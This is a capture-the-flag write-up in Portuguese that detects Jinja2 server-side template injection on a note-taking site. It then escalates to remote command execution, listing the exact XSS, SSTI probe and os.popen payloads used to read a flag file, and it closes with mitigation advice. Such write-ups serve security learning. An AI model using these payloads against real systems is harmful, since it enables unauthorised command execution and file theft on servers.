# Your Notepad
###### Solved by @Juh-s
>This is a CTF about Web Exploitation and SSTI
## Sobre o desafio

O desafio consiste em acessar um site desenvolvido para anotações, identificar a vulnerabilidade existente e explorá-la a fim de obter acesso à flag.

**Link para o desafio**:

[Your Notepad](https://notethis.discloud.app/)

## Solução
**Introdução**

Ao acessar o site dado no enunciado, esse é o conteúdo:

<img width="1911" height="902" alt="image" src="https://github.com/user-attachments/assets/16012f93-b1a6-42d5-81ee-51f78f79ed9a" />

Um teste para entender o funcionamento do site:

<img width="1908" height="896" alt="image" src="https://github.com/user-attachments/assets/04d414d0-173e-4da2-8b12-e5ffe1080aa7" />

**Análise Inicial**

Com esse teste feito, é possível entender que a aplicação está refletindo o input do usuário na tela. Dessa forma, é possível testar tipos diferentes de vulnerabilidades, como Cross-Site Scripting (XSS) ou Server Side Template Injection (SSTI).

Porém, ao tentar alguns payloads clássicos de XSS como: `<h1>teste</h1>`, `<script>alert(1)</script>`, `<img src="x" onerror="alert(1)">`, `<svg onload=alert(1)>`, apenas o primeiro payload foi renderizado como HTML válido e ele não seria de grande ajuda, visto que ele é uma tag inofensiva, então para não precisar testar diversas formas de executar JavaScript no HTML, é mais vantajoso tentar explorar a vulnerabilidade de SSTI, já que ela pode tem um maior impacto.

Uma informação muito importante para saber se um servidor é vulnerável a SSTI é analisar essa tabela, que nos indica qual engine está sendo usada:

Partindo então para SSTI, temos que entender a seguinte imagem:

<img width="640" height="386" alt="image" src="https://github.com/user-attachments/assets/d9da9aa9-b5b2-4c66-a7d0-745310fde3f7" />

Seguindo o passo a passo do fluxograma, usando o input `${7*7}` primeiro:

<img width="1911" height="835" alt="image" src="https://github.com/user-attachments/assets/50b670f8-8b21-403c-9f54-03f82dc0baf6" />

O site renderiza literalmente `${7*7}`, ou seja, podemos descartar a parte de cima do fluxograma.

Porém, ao passar para o próximo passo, `{{7*7}}`: 

<img width="1911" height="842" alt="image" src="https://github.com/user-attachments/assets/b1a8896a-6876-424c-bf01-f2376e92f475" />

Dessa vez, o site avalia o resultado como `49`.

E por último, usando o último passo do fluxograma, `{{7*'7'}}`: 

<img width="1907" height="811" alt="image" src="https://github.com/user-attachments/assets/fe8f3ca4-9c5a-41d3-bac7-2edadafb2de1" />

O site nos retornou `7777777` e isso é importante para sabermos em qual ambiente estamos, podendo então, explorá-lo da maneira correta. Nesse caso, temos o Jinja2.

**Análise Final**

Sabendo qual engine está sendo usada, podemos testar alguns os payloads clássicos dela, em uma ordem de escalada sistemática a depender do nível de restrição que o ambiente possui, tais como:

* [1]`{{ "".__class__.__mro__[1] }}`
* [2]`{{ "".__class__.__mro__[1].__subclasses__() }}`
* [3]`{{ config.__class__.__init__.__globals__['os'].popen('ls').read() }}`
* [4]`{{ config.__class__.__init__.__globals__['__builtins__']['__import__']('os').popen('ls').read() }}`
* [5]`{{ lipsum.__globals__['__builtins__']['__import__']('os').popen('ls').read() }}`

[1]: Não tive nenhum retorno.

[2]: Acessou a classe base do Pyhton (object) e listou todas as subclasses que estão carregadas na memória do servidor no momento.

<img width="1913" height="945" alt="image" src="https://github.com/user-attachments/assets/33368aac-ab2f-4baf-b195-3836b24b5c9f" />

[3]: Deu erro e fez o site cair.

[4] e [5]: Retornaram--> discloud.config main.py requirements.txt secrets777666 templates

<img width="1913" height="902" alt="image" src="https://github.com/user-attachments/assets/dc9c5c4e-89a6-4237-9476-f6c3fe3fcf2a" />

Feito isso, com os payloads [4] e [5] temos a visão clara do diretório atual. O item `secrets777666` é o que chama mais a atenção para o local em que a flag pode estar guardada, então o próximo passo é descobrir se isso é um arquivo ou um diretório para poder extrair o conteúdo.

Testando o payload para confirmar se é um arquivo:

`{{ lipsum.__globals__['__builtins__']['__import__']('os').popen('cat secrets777666').read() }}`, não obtive retorno nenhum.

Mas testando o payload para confirmar se é um diretório: `{{ lipsum.__globals__['__builtins__']['__import__']('os').popen('ls -la secrets777666').read() }}`, o retorno foi de: `total 12 drwxrwxrwx 2 user_discloud user_discloud 4096 Jan 21 17:34 . drwx------ 4 user_discloud user_discloud 4096 Feb 12 09:48 .. -rw-rw-rw- 1 user_discloud user_discloud 37 Jan 22 14:37 flag.txt`

<img width="1916" height="942" alt="image" src="https://github.com/user-attachments/assets/991a7c22-eb8b-43ae-9edf-26f75aacc1fe" />

Na saída que recebemos, podemos ver as permissões do arquivo: `-rw-rw-rw-`, isso significa que o usuário que está rodando a aplicação `user_discloud` tem permissão de leitura nativa para esse arquivo: `flag.txt`.

**Solução**

Para ler o arquivo `flag.txt` dentro do diretório `secrets777666` basta usar o seguinte payload:

`{{ lipsum.__globals__['__builtins__']['__import__']('os').popen('cat secrets777666/flag.txt').read() }}`

<img width="1915" height="892" alt="image" src="https://github.com/user-attachments/assets/9da1aff1-3433-40e5-9a26-f7dddad0bbce" />

Feito isso, conseguimos obter a flag:

>`DUCK{777_KNOW_ALL_YOUR_TEMPLATES_777}`

**Mitigação**

Para previnir ataques de SSTI em aplicações Python/Jinja2, é possível adotar as seguintes práticas:

* Validação de entrada: Todas as entradas do usuário devem ser tratadas como não confiáveis e passar por validação e sanitização rigorosa antes de serem processadas. 
* Uso de listas de permissão: Em vez de tentar filtrar conteúdo potencialmente perigoso, é mais seguro permitir apenas conteúdo seguro.
* Implementação de pentests regulares: Realizar testes de penetração frequentes pode ajudar a identificar vulnerabilidades antes que se tornem problemas.

Essas práticas ajudam a proteger aplicações web contra ataques de SSTI e a manter a segurança dos dados.
